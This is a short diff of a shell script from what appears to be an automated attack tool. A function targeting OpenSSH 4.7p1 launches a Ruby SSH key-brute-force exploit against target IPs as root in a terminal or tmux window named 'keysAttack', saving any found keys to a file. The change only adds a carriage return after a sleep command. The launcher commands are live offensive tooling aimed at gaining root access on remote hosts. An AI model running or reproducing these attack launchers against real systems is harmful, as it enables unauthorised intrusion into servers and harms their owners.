@@ -330,10 +330,10 @@ function OpenSSH4_7p1(){
 	then
 		if [ "$terminal" = "gnome" ]
 		then
-			gnome-terminal -e "bash -c 'ruby $dir_path/exploits/ssh/5632 $ips root $dir_path/exploits/ssh/rsa/2048 > $ips/keys.txt; sleep 1; bash'" 2> /dev/null
+			gnome-terminal -e "bash -c 'ruby $dir_path/exploits/ssh/5632 $ips root $dir_path/exploits/ssh/rsa/2048 > $ips/keys.txt; sleep 1\r; bash'" 2> /dev/null
 			sleep 10
 		else
-			tmux new-window -n keysAttack "bash -c 'ruby $dir_path/exploits/ssh/5632 $ips root $dir_path/exploits/ssh/rsa/2048 > $ips/keys.txt; sleep 1; read; bash'" \; 2> /dev/null
+			tmux new-window -n keysAttack "bash -c 'ruby $dir_path/exploits/ssh/5632 $ips root $dir_path/exploits/ssh/rsa/2048 > $ips/keys.txt; sleep 1 \r; read; bash'" \; 2> /dev/null
 			sleep 10
 		fi
 	fi
